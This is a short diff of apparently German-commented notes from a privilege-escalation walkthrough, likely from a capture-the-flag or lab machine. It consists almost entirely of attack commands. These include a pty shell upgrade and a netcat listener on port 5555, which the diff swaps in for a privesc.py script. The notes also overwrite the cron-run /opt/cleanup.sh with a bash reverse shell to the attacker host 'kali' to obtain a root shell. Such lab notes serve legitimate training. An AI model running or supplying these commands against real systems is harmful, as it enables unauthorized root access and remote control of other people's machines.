@@ -79,7 +79,7 @@ bash -i >& /dev/tcp/kali/5555 0>&1' >> /opt/cleanup.sh
 python3 -c 'import pty; pty.spawn("/bin/bash")' # Upgrade zu einer fähigeren Shell
 
 #cron überschreiben
-python3 privesc.py #im extra Terminal starten um auf die root shell zu warten
+nc -lvnp 5555 #im extra Terminal starten um auf die root shell zu warten
 
 echo '#!/bin/bash' > /opt/cleanup.sh
 echo 'bash -i >& /dev/tcp/kali/5555 0>&1' >> /opt/cleanup.sh
